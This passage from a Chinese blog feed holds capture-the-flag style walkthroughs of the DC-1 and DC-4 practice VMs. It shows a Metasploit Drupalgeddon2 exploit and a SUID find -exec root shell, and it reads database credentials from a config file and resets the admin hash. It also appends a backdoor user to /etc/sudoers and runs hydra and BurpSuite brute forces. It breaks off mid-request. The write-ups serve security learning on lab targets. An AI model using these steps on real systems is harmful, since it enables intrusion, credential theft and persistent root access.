Call）的缩写形式。SAP系统RPC调用的原理其实很简单，有一些类似于三层构架的C/S系统，第三方的客户程序通过接口调用SAP内部的标准或自定义函数，获得函数返回的数据进行处理后显示或打印。</p></blockquote></li><li><p>接着就是用<code>nikto</code>扫描一下web服务</p></li><li><p>让他先扫描…</p></li><li><p>nikto扫描得到两个比较有用的地址</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.119/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 <span class="comment">#这个是phpinfo()</span></span><br><span class="line">http://192.168.0.119/xmlrpc.php <span class="comment">#这个只有这样一句话：XML-RPC server accepts POST requests only.</span></span><br></pre></td></tr></table></figure><ul><li><p>也不知道咋用啊。。。。</p></li><li><p>我们进浏览器看看</p></li><li><p>就是一个登录的页面？</p></li><li><p>用插件 <code>wappalyzer</code>看到web的框架是 <code>Drupal 7</code></p></li><li><p>先看看存不存在框架漏洞</p></li><li><p>直接启动我们的神器：<code>msfconsole</code> </p></li><li><p>搜索一下框架漏洞<code>search Drupal</code></p></li><li><p>找到好几个呢，我们直接使用最新的</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Name:</span><br><span class="line">exploit/unix/webapp/drupal_drupalgeddon2       </span><br><span class="line">Disclosure Date:</span><br><span class="line">2018-03-28       </span><br><span class="line">Rank:</span><br><span class="line">excellent  </span><br><span class="line">Check:</span><br><span class="line">Yes    </span><br><span class="line">Description：</span><br><span class="line">Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">(Drupal Drupalgeddon 2表单API属性注入)</span><br></pre></td></tr></table></figure><ul><li><code>show options</code> 看看要什么参数，</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   RHOSTS                        yes       The target address range or CIDR </span><br><span class="line">   <span class="comment">#只要设置这个就能跑了</span></span><br></pre></td></tr></table></figure><ul><li><p>那就设置：<code>set RHOST 192.168.0.119</code></p></li><li><p>接着就是激动人心的时刻了: <code>exploit</code> </p></li><li><p>得到一个会话，成了~</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Sending stage (38247 bytes) to 192.168.0.119</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.0.21:4444 -&gt; 192.168.0.119:34430) at 2020-04-24 15:40:03 +0800</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#获得标准shell</span></span><br><span class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure><ul><li><p><code>ls</code> 一下，看到一个<code>flag1.txt</code>的文件</p></li><li><p><code>cat</code> 一下：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br><span class="line"><span class="comment">#每一个好的CMS都需要一个配置文件-你也是。</span></span><br></pre></td></tr></table></figure><ul><li><p>找配置文件？不知道</p></li><li><p>百度去~ </p></li><li><p>找到是在<code>/var/www/sites/default/setting.php</code></p></li><li><p><code>cat</code> 一下</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren't the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> * 不是暴力和字典攻击</span></span><br><span class="line"><span class="comment"> * 只有获得访问权限的方法（而且您将需要访问权限）。</span></span><br><span class="line"><span class="comment"> * 你能用这些证件做什么？</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt;</span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt;</span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupaldb'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'dbuser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'R0ck3t'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li><p>找到了flag2，还看到了数据库的账号密码</p></li><li><p>登录<code>mysql</code>看看</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br></pre></td></tr></table></figure><ul><li>我们先看看有什么数据库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.02 sec)</span><br></pre></td></tr></table></figure><ul><li><p>没有mysql库 <code>~_~||</code></p></li><li><p>那就进 <code>drupaldb</code>看看网站的登录密码吧~</p></li><li><p><code>use drupaldb</code> <code>show tables;</code></p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| <span class="built_in">history</span>                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br></pre></td></tr></table></figure><ul><li><p>好多表啊~~</p></li><li><p>有个 <code>users</code>我们查询一下</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select uid,name,pass from users;</span><br><span class="line">+-----+-------+---------------------------------------------------------+</span><br><span class="line">| uid | name  | pass                                                    |</span><br><span class="line">+-----+-------+---------------------------------------------------------+</span><br><span class="line">|   0 |       |                                                         |</span><br><span class="line">|   1 | admin | <span class="variable">$S</span><span class="variable">$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5</span>.i38jnEKuDR |</span><br><span class="line">|   2 | Fred  | <span class="variable">$S</span><span class="variable">$DWGrxef6</span>.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg |</span><br><span class="line">+-----+-------+---------------------------------------------------------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><ul><li><p>这后面是什么鬼密码？？</p></li><li><p>不是MD5，咋办<del>~</del></p></li><li><p>找官网搜索密码重置</p></li><li><p>最后在 <code>https://www.drupal.org/node/1023428</code> 找到相关方法</p></li><li><p>说执行 <code>./scripts/password-hash.sh newpwd</code>可以得到一个新密码</p></li><li><p>那我们把它admin用户的密码给改了</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./scripts/password-hash.sh 1234</span><br><span class="line">password: 1234          </span><br><span class="line"><span class="built_in">hash</span>: <span class="variable">$S</span><span class="variable">$DSM0f3PE7gij</span>.NOoFJC2nqT1A8.1M6hh5LHeeQ62d.ghV0I9yz6U</span><br></pre></td></tr></table></figure><ul><li>进数据库给他改了</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> <span class="keyword">set</span> pass=<span class="string">'$S$DSM0f3PE7gij.NOoFJC2nqT1A8.1M6hh5LHeeQ62d.ghV0I9yz6U'</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> uid=<span class="number">1</span>;</span><br><span class="line">Query OK, 1 row affected (0.06 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br></pre></td></tr></table></figure><ul><li><p>登录网站。点击上面的 <code>content</code></p></li><li><p>找到一篇 <code>flag3</code>的文章内容是：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Special PERMS will <span class="built_in">help</span> FIND the passwd - but you<span class="string">'ll need to -exec that command to work out how to get what'</span>s <span class="keyword">in</span> the shadow.</span><br></pre></td></tr></table></figure><ul><li><p>找到关键信息：<code>FIND -exec</code> 和 <code>shadow</code>；</p></li><li><p>那我们去看看 <code>/etc/shadow</code> 文件：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat: /etc/shadow: Permission denied</span><br></pre></td></tr></table></figure><ul><li><p>没有权限？</p></li><li><p>那 <code>/etc/passwd</code>呢？</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/bin/sh</span><br><span class="line">man:x:6:12:man:/var/cache/man:/bin/sh</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/bin/sh</span><br><span class="line">mail:x:8:8:mail:/var/mail:/bin/sh</span><br><span class="line">news:x:9:9:news:/var/spool/news:/bin/sh</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh</span><br><span class="line">proxy:x:13:13:proxy:/bin:/bin/sh</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/bin/sh</span><br><span class="line">backup:x:34:34:backup:/var/backups:/bin/sh</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/bin/sh</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/bin/sh</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/bin/sh</span><br><span class="line">libuuid:x:100:101::/var/lib/libuuid:/bin/sh</span><br><span class="line">Debian-exim:x:101:104::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:102:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:103:107::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash</span><br></pre></td></tr></table></figure><ul><li>找到一个<code>flag4</code>的用户home目录在<code>/home/flag4</code></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls /home/flag4</span><br><span class="line">flag4.txt</span><br></pre></td></tr></table></figure><ul><li>有一个 <code>flag4.txt</code>我们试着读取一下</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat /home/flag4/flag4.txt</span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line">Probably. But perhaps it<span class="string">'s not that easy.  Or maybe it is?</span></span><br><span class="line"><span class="string">您可以使用相同的方法在根目录中查找或访问标志吗？</span></span><br><span class="line"><span class="string">可能。但也许不是那么容易。或许是这样？</span></span><br></pre></td></tr></table></figure><ul><li>在根目录查找？</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用find'随便查找一个文件 然后-exec 来启shell</span></span><br><span class="line">find ./ xxx -<span class="built_in">exec</span> <span class="string">'/bin/sh'</span> \;</span><br></pre></td></tr></table></figure><ul><li><p>得到一个有root权限的shell</p></li><li><p><code>cd</code> 到<code>/root</code>下:</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment"># 有一个thefinalflag.txt文件</span></span><br><span class="line">    cat thefinalflag.txt</span><br><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line">    Hopefully you<span class="string">'ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string">    You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">    by contacting me via Twitter - @DCAU7</span></span><br></pre></td></tr></table></figure><ul><li><p>完成了~</p></li><li><p>给他留个用户吧~</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个可以登录的用户在root并设置密码</span></span><br><span class="line">useradd rex -m -s /bin/bash -d /home/rex -g root;passwd rex</span><br><span class="line"><span class="comment">#给他root权限</span></span><br><span class="line">chmod u+w /etc/sudoers;<span class="built_in">echo</span> <span class="string">'rex  ALL=(ALL:ALL) ALL'</span> &gt;&gt; /etc/sudoers;chmod u-w /etc/sudoers</span><br></pre></td></tr></table></figure><ul><li>不料：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/sh: 20: useradd: not found <span class="comment">#没有useradd这个命令？</span></span><br></pre></td></tr></table></figure><ul><li><p>额嘿嘿，5个flag都拿到了，算了算了。</p></li><li><p>后来爆破了flag4的密码：</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#爆破密码：</span></span><br><span class="line">hydra -l flag4 -P /tmp/password.lst -t 5 ssh://192.168.0.119</span><br><span class="line"><span class="comment"># 密码字典在 /usr/share/john/password.lst</span></span><br><span class="line"><span class="comment"># 也可以自己定制</span></span><br></pre></td></tr></table></figure><p>​    </p><h2><span id="2重要信息">2.重要信息</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1. mysql 账号密码：</span></span><br><span class="line">user：dbuser passwd：R0ck3t</span><br><span class="line"><span class="comment">#2. ssh 的账号密码：</span></span><br><span class="line">user：flag4 passwd orange</span><br></pre></td></tr></table></figure><h2><span id="3-flag">3. flag</span></h2><ol><li><pre><code class="js"># flag1# 在网站的目录下# 内容是：Every good CMS needs a config file - and so <span class="keyword">do</span> you.#每一个好的CMS都需要一个配置文件-你也是。&lt;!--￼<span class="number">25</span>--&gt;</code></pre></li><li><pre><code class="js"># flag3# 在网站登录后的content里面# 内容是：<span class="string">"Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow."</span>&lt;!--￼<span class="number">26</span>--&gt;</code></pre></li><li><pre><code class="js"># flag5# /root/thefinalflag.txt root用户目录下的thefinalflag.txt文件# 内容是：<span class="string">"Well done!!!!"</span><span class="string">"Hopefully you've enjoyed this and learned some new skills."</span><span class="string">"You can let me know what you thought of this little journey"</span><span class="string">"by contacting me via Twitter - @DCAU7"</span>&lt;!--￼<span class="number">27</span>--&gt;</code></pre></li></ol><h2><span id="the_end"><strong>THE_END</strong></span></h2>]]></content>
    
    <summary type="html">
    
      &lt;!-- toc --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#dc-1-靶机渗透&quot;&gt;DC-1 靶机渗透&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#1渗透过程&quot;&gt;1.渗透过程&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#2重要信息&quot;&gt;2.重要信息&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#3-flag&quot;&gt;3. flag&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#__the_end__&quot;&gt;&lt;strong&gt;THE_END&lt;/strong&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;!-- tocstop --&gt;
    
    </summary>
    
    
      <category term="靶机渗透" scheme="https://atc96.top/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="网络渗透" scheme="https://atc96.top/tags/%E7%BD%91%E7%BB%9C%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>DC-4 靶机渗透</title>
    <link href="https://atc96.top/DC-4/"/>
    <id>https://atc96.top/DC-4/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-10T10:08:10.892Z</updated>
    
    <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#dc4-靶机渗透">DC4 靶机渗透</a><ul><li><a href="#1-渗透过程">1. 渗透过程</a></li><li><a href="#__the_end__"><strong>!!!THE_END!!!</strong></a></li><li><a href="#2-重要数据">2. 重要数据</a></li></ul></li></ul><!-- tocstop --><a id="more"></a><h1><span id="dc4-靶机渗透">DC4 靶机渗透</span></h1><h2><span id="1-渗透过程">1. 渗透过程</span></h2><ul><li>主机发现</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.0.1/24</span><br></pre></td></tr></table></figure><ul><li><p>找到IP地址： <code>192.168.0.123</code></p></li><li><p>扫描端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/workspace<span class="comment"># nmap -sS -A -p- 192.168.0.123</span></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-03 14:49 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.0.123</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:84:3B:AB (VMware)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><ul><li><p>看看80端口</p></li><li><p>只有一个登录框</p></li><li><p>抓个包试试</p></li><li><p>先试试有没有sql注入</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://192.168.0.123 --data <span class="string">"username=admin&amp;password=1122"</span></span><br></pre></td></tr></table></figure><ul><li><p>并没发现sql注入</p></li><li><p>扫描下目录</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.0.123</span><br></pre></td></tr></table></figure><ul><li><p>还是没啥啊~</p></li><li><p>只有爆破这条路了？</p></li><li><p>使用了BurpSuite爆破</p></li><li><p>得到账号密码：<code>admin : happy</code></p></li><li><p>然后登陆</p></li><li><p>是一个执行命令的~</p></li><li><p>但是只有一些简单的命令</p></li><li><p>然后抓一个包，发现并没有对命令过滤。直接就提交了。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /command.php HTTP/1.1</span><br><span class="line">Host: 192.168.0.123</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: 